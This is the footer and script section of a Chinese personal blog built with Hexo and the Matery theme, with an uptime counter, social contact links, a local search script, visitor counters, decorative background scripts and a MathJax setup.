            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">378.4k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2022";
                    var startMonth = "8";
                    var startDate = "13";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/sxhthreo" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub"
        data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>
    

        
            <a href="mailto:951161604@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我"
                data-position="top" data-delay="50">
                <i class="fas fa-envelope-open"></i>
            </a>
            

                

                        

                                
                                    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=951161604"
                                        class="tooltipped" target="_blank"
                                        data-tooltip="QQ联系我: 951161604" data-position="top"
                                        data-delay="50">
                                        <i class="fab fa-qq"></i>
                                    </a>
                                    

                                        

                                                
                                                    <a href="https://www.zhihu.com/people/shui-he-qing-chi-zi-14" class="tooltipped"
                                                        target="_blank"
                                                        data-tooltip="关注我的知乎: https://www.zhihu.com/people/shui-he-qing-chi-zi-14"
                                                        data-position="top" data-delay="50">
                                                        <i class="fab fa-zhihu1">知</i>
                                                    </a>
                                                    

                                                        

                                                                
                                                                    <a href="https://blog.csdn.net/sxH3O?type=blog"
                                                                        class="tooltipped" target="_blank"
                                                                        data-tooltip="关注我的CSDN: https://blog.csdn.net/sxH3O?type=blog"
                                                                        data-position="top" data-delay="50">
                                                                        <i class="fab fa-csdn">C</i>
                                                                    </a>
                                                                    </div>
    </div>
</footer>

<div class="progress-bar"></div>


                                <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

                                    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


                                        <script
                                            src="/libs/materialize/materialize.min.js"></script>
                                        <script
                                            src="/libs/masonry/masonry.pkgd.min.js"></script>
                                        <script
                                            src="/libs/aos/aos.js"></script>
                                        <script
                                            src="/libs/scrollprogress/scrollProgress.min.js"></script>
                                        <script
                                            src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
                                        <script
                                            src="/js/matery.js"></script>

                                        <!-- Baidu Analytics -->

                                            <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

                                                
                                                    <script
                                                        src="/libs/others/clicklove.js"
                                                        async="async"></script>
                                                    
                                                        
                                                            <script async
                                                                src="/libs/others/busuanzi.pure.mini.js"></script>
                                                            

                                                                

                                                                        

                                                                                
                                                                                        
                                                                                            <script
                                                                                                type="text/javascript"
                                                                                                color="0,0,255"
                                                                                                pointColor="0,0,255"
                                                                                                opacity='0.7'
                                                                                                zIndex="-1"
                                                                                                count="99"
                                                                                                src="/libs/background/canvas-nest.js"></script>
                                                                                            

                                                                                                

                                                                                                            
                                                                                                                <script
                                                                                                                    type="text/javascript"
                                                                                                                    src="/libs/background/ribbon-dynamic.js"
                                                                                                                    async="async"></script>
                                                                                                                

                                                                                                                    
                                                                                                                        <script
                                                                                                                            src="/libs/instantpage/instantpage.js"
                                                                                                                            type="module"></script>
                                                                                                                        




                <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>